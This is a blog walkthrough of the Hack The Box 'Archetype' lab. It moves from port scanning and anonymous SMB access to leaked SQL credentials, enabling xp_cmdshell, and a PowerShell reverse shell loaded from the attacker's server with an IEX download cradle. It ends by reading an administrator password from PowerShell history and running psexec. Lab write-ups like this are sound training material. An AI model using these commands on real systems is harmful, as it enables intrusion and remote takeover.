<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="HTB - Archetype Walkthrough"><meta name="keywords" content="WalkThrough,Penetration Testing,HTB,Starting Point"><meta name="author" content="Gavin Cui"><meta name="copyright" content="Gavin Cui"><title>HTB - Archetype Walkthrough | Gavin's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Scan-for-opening-ports"><span class="toc-number">1.1.</span> <span class="toc-text">Scan for opening ports</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gavin Cui</div><div class="author-info__description text-center">No Description</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">30</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">11</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gavin's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">HTB - Archetype Walkthrough</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-08</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Scan-for-opening-ports"><a href="#Scan-for-opening-ports" class="headerlink" title="Scan for opening ports"></a>Scan for opening ports</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate&#x3D;1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d &#39;&#x2F;&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s&#x2F;,$&#x2F;&#x2F; &gt;&gt; ports.txt</span><br><span class="line"></span><br><span class="line">tr: change \n to ,</span><br><span class="line">sed s&#x2F;,$ replace the last &#96;,&#96; to empty</span><br></pre></td></tr></table></figure>
<p>more detailed scan</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p&#96;cat ports.txt&#96; 10.10.10.27</span><br></pre></td></tr></table></figure>
<p>Results:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">135&#x2F;tcp   open     msrpc        Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp   open     netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445&#x2F;tcp   open     microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds</span><br><span class="line">1433&#x2F;tcp  open  ms-sql-s Microsoft SQL Server 2017 </span><br><span class="line">5985&#x2F;tcp  open     http         Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">47001&#x2F;tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664&#x2F;tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">49665&#x2F;tcp filtered unknown</span><br><span class="line">49667&#x2F;tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">49668&#x2F;tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">49669&#x2F;tcp closed   unknown</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:&#x2F;o:microsoft:windows</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port 445: Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack. Using TCP allows SMB to work over the internet.</span><br></pre></td></tr></table></figure>
<p>445 are open (file sharing smb)</p>
<p>check anonymous login</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L \\\\10.10.10.27 </span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line">	ADMIN$          Disk      Remote Admin</span><br><span class="line">	backups         Disk      </span><br><span class="line">	C$              Disk      Default share</span><br><span class="line">	IPC$            IPC       Remote IPC</span><br><span class="line"></span><br><span class="line">-N: dot not ask for password</span><br><span class="line">-L: list shares</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N \\\\10.10.10.27\\backups</span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                   D        0  Mon Jan 20 07:20:57 2020</span><br><span class="line">  ..                                  D        0  Mon Jan 20 07:20:57 2020</span><br><span class="line">  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020</span><br><span class="line"></span><br><span class="line">		10328063 blocks of size 4096. 8248806 blocks available</span><br><span class="line">get prod.dtsConfig</span><br></pre></td></tr></table></figure>

<p>A DTSCONFIG file is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages. The file contains one or more package configurations that consist of metadata such as the server name, database names, and other connection properties to configure SSIS packages.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;DTSConfiguration&gt;</span><br><span class="line">    &lt;DTSConfigurationHeading&gt;</span><br><span class="line">        &lt;DTSConfigurationFileInfo GeneratedBy&#x3D;&quot;...&quot; GeneratedFromPackageName&#x3D;&quot;...&quot; GeneratedFromPackageID&#x3D;&quot;...&quot; GeneratedDate&#x3D;&quot;20.1.2019 10:01:34&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;DTSConfigurationHeading&gt;</span><br><span class="line">    &lt;Configuration ConfiguredType&#x3D;&quot;Property&quot; Path&#x3D;&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType&#x3D;&quot;String&quot;&gt;</span><br><span class="line">        &lt;ConfiguredValue&gt;Data Source&#x3D;.;Password&#x3D;M3g4c0rp123;User ID&#x3D;ARCHETYPE\sql_svc;Initial Catalog&#x3D;Catalog;Provider&#x3D;SQLNCLI10.1;Persist Security Info&#x3D;True;Auto Translate&#x3D;False;&lt;&#x2F;ConfiguredValue&gt;</span><br><span class="line">    &lt;&#x2F;Configuration&gt;</span><br><span class="line">&lt;&#x2F;DTSConfiguration&gt;</span><br></pre></td></tr></table></figure>

<p>port 1433 is default port for ms-sql-s</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py ARCHETYPE&#x2F;sql_svc@10.10.10.27 -windows-auth</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  target                [[domain&#x2F;]username[:password]@]&lt;targetName or address&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>entered the database</p>
<p>check weather the current user has system level privilege</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;);</span><br><span class="line">              </span><br><span class="line"></span><br><span class="line">-----------   </span><br><span class="line"></span><br><span class="line">          1 </span><br></pre></td></tr></table></figure>

<p>change configuration to make xp_cmdshell available:<br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver15">https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver15</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;Show Advanced Options&#39;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">sp_configure;</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;, 1</span><br><span class="line">reconfigure;</span><br><span class="line">xp_cmdshell &quot;whoami&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>xp_cmdshell:<br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15</a></p>
<p>powershell reverse shell:<br><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reverseshell.ps</span><br><span class="line"></span><br><span class="line">$client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.73&#39;,4242);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$client &#x3D; New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.73&quot;,4242);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &quot;# &quot;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br></pre></td></tr></table></figure>

<p>open a webserver for servering the file</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br><span class="line"></span><br><span class="line">listening for the reverse shell:</span><br><span class="line">nc -vnlp 4242</span><br></pre></td></tr></table></figure>

<p>in sql execute:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\&quot;http:&#x2F;&#x2F;10.10.14.73&#x2F;ps_shell2.ps1\&quot;);&quot;</span><br></pre></td></tr></table></figure>

<p>not sure why the first script get blocked by antivirus software</p>
<p>the flag file stored in :C:\Users\sql_svc\Desktop\user.txt</p>
<p>privilege escalation:</p>
<p>find frequent accessed file or commands:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line"></span><br><span class="line">net.exe use T: \\Archetype\backups &#x2F;user:administrator MEGACORP_4dm1n!!</span><br><span class="line">exit</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Net_(command)">https://en.wikipedia.org/wiki/Net_(command)</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use: Connect&#x2F;disconnect computer to&#x2F;from shared resources, or display information about computer connections</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>connect to the admin user and look at the desktop</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.py administrator@10.10.10.27</span><br><span class="line"></span><br><span class="line">cd C:\Users\administrator\Desktop</span><br></pre></td></tr></table></figure>

<p>to use psexec, port445 need to open </p>
<p>Prerequisites:</p>
<ul>
<li>A modern Windows computer (local)</li>
<li>File and Printer Sharing open (remote computer, TCP port 445)</li>
<li>The admin$ administrative share available (remote computer)</li>
<li>You know a local account’s credential (remote computer)</li>
</ul>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Gavin Cui</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://gavincrz.github.io/2021/08/09/HTB-Archetype-Walkthrough/">https://gavincrz.github.io/2021/08/09/HTB-Archetype-Walkthrough/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WalkThrough/">WalkThrough</a><a class="post-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a><a class="post-meta__tags" href="/tags/HTB/">HTB</a><a class="post-meta__tags" href="/tags/Starting-Point/">Starting Point</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/08/10/HTB-Oopsie-Walkthrough/"><i class="fa fa-chevron-left">  </i><span>HTB - Oopsie Walkthrough</span></a></div><div class="next-post pull-right"><a href="/2021/08/04/Interview-Preparation/"><span>Security Interview Preparation</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By Gavin Cui</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>